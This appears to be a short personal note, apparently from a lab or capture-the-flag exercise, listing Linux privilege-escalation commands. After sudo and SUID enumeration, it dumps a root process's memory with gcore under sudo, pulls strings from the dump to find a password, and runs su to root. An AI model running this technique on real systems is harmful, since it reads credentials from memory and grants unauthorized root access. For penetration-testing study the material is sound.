```bash - kali
sudo -l
```

![[Pasted image 20221115144913.png]]

```bash - kali
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

![[Pasted image 20220407154438.png]]

```bash - kali
ps aux | grep root
```

![[Pasted image 20220407154514.png]]

```bash - kali
sudo -u root /usr/bin/gcore -a -o /home/$USER/output 25737
```

```bash - kali
strings /home/$USER/output.25737
```

```bash - kali
su root
```


